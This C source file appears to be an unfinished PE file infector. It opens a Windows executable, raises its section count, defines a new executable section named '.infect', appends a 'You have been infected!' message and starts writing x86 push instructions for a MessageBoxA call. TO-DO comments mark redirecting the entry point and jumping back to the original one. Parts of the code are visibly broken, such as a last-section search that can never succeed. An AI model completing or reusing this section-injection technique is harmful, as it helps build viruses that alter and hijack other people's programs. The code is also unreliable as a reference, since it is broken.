#include "main.h"

int main(int argc, char *argv[]) {
	if (argc < 2) {
		printf("Missing argument.\n");
		printf("Usage: section path\\to\\PE\\executable (Windows)\n");
		exit(1);
	}

	// argv[1] = Path to executable
	FILE *fr = fopen(argv[1], "r+b");
	FILE *fa = fopen(argv[1], "ab");
	FILE *f[2] = { fr, fa };

	IMAGE_DOS_HEADER imageDosHeader;
	IMAGE_FILE_HEADER imageFileHeader;
	IMAGE_OPTIONAL_HEADER imageOptionalHeader;

	// Verify magic byte (0x4D 0x5A == "MZ")
	imageDosHeader.e_magic = getval(fr, dw, SEEK_SET,0);
	if (imageDosHeader.e_magic != 0x5a4d) {
		printf("Input error. File is not a PE executable.");
		end(f, 1);
	}

	imageDosHeader.e_lfanew = getval(fr, dd, SEEK_SET, 0x3C);

	imageFileHeader.NumberOfSections =
		getval(fr, dw, SEEK_SET, imageDosHeader.e_lfanew+6);
	setval_int(fr,imageFileHeader.NumberOfSections+1,
		dw,SEEK_SET,imageDosHeader.e_lfanew+6);

	imageFileHeader.SizeOfOptionalHeader =
		getval(fr, dw, SEEK_SET, imageDosHeader.e_lfanew + 20);

	DWORD ioh_addr = imageDosHeader.e_lfanew + 24;

	// 0x10B => 32-bit
	// 0x20B => 64-bit
	imageOptionalHeader.Magic = getval(fr, dw, SEEK_SET, ioh_addr);

	// TO-DO: Change entry point
	imageOptionalHeader.AddressOfEntryPoint =
		getval(fr, dd, SEEK_SET, ioh_addr+16);
	imageOptionalHeader.ImageBase =
		getval(fr,dd, SEEK_SET, ioh_addr+28);
	imageOptionalHeader.SectionAlignment =
		getval(fr, dd, SEEK_SET, ioh_addr+32);
	imageOptionalHeader.FileAlignment =
		getval(fr, dd, SEEK_SET, ioh_addr+36);
	// TO-DO: Increase SizeOfImage
	imageOptionalHeader.SizeOfImage =
		getval(fr, dd, SEEK_SET,ioh_addr + 56);

	// DWORD lastish_addr = ioh_addr + imageFileHeader.SizeOfOptionalHeader
		// + 40 * (imageFileHeader.NumberOfSections-1);

	// Find address of last section header
	// Necessary? Not if section header is organised by the order of the sections' appearance in the programme
	DWORD lastish_addr = 0;
	for (int i = 0; i < imageFileHeader.NumberOfSections; i++) {
		DWORD tempval = getval(fr,dd, SEEK_SET,
			ioh_addr + imageFileHeader.SizeOfOptionalHeader + 40*i + 12);
		if (tempval < lastish_addr)
			lastish_addr = tempval;
	}

	IMAGE_SECTION_HEADER lastish;

	lastish.VirtualAddress =
		getval(fr, dd, SEEK_SET, lastish_addr + 12);
	lastish.SizeOfRawData = getval(fr, dd, SEEK_SET, lastish_addr + 16);

	DWORD newish_addr = lastish_addr + 40;
	IMAGE_SECTION_HEADER newish = {
		// Name
		".infect",
		// Misc.VirtualSize
		0, // Edit to reflect actual size
		// VirtualAddress
		closest(lastish.VirtualAddress + lastish.SizeOfRawData, imageOptionalHeader.SectionAlignment),
		// SizeOfRawData
		closest(newish.Misc.VirtualSize,imageOptionalHeader.FileAlignment),
		// PointerToRawData
		0, // Edit
		// PointerToRelocations
		0,
		// PointerToLinenumbers
		0,
		// NumberOfRelocations
		0,
		// NumberOfLinenumbers
		0,
		// Characteristics
		0x60000060,
			// IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ
			// 0x00000020 | 0x00000040 | 0x20000000 | 0x40000000
	};

	// Adding new section
	fseek(fr, 0, SEEK_END);
	const long old_end = ftell(fr);
	const long newsh_addr = closest(old_end+1,imageOptionalHeader.SectionAlignment);
	const char *msgCaption = "Notice";
	const char *msgText = "You have been infected!";

	pad(fa, newsh_addr - old_end);
	// Should be written at newsh_addr
	fwrite(msgCaption, strlen(msgCaption)+1, 1, fa);
	// Should be written at newsh_addr + strlen(msgCaption) + 1
	fwrite(msgText, strlen(msgText)+1, 1, fa);
	instruct(fa, 0x68, 0x1030);
	instruct(fa, 0x68, imageOptionalHeader.ImageBase+newsh_addr);
	instruct(fa, 0x68, imageOptionalHeader.ImageBase + newsh_addr + strlen(msgCaption) + 1);
	instruct(fa, 0x6a, 0);

	// Call MessageBoxA

	// Jmp back to old AddressOfEntryPoint

	setval_char(fr, newish.Name,8, SEEK_SET, newish_addr);
	setval_int(fr, newish.Misc.VirtualSize, dd, SEEK_CUR, 0);
	setval_int(fr, newish.VirtualAddress, dd, SEEK_CUR, 0);
	setval_int(fr, newish.SizeOfRawData, dd, SEEK_CUR, 0);
	setval_int(fr, newish.PointerToRawData, dd, SEEK_CUR, 0);
	setval_int(fr,newish.PointerToRelocations, dd, SEEK_CUR, 0);
	setval_int(fr, newish.PointerToLinenumbers, dd, SEEK_CUR, 0);
	setval_int(fr, newish.NumberOfRelocations, dw, SEEK_CUR, 0);
	setval_int(fr, newish.NumberOfLinenumbers, dw, SEEK_CUR, 0);
	setval_int(fr, newish.Characteristics, dd, SEEK_CUR, 0);



	end(f, 0);
}
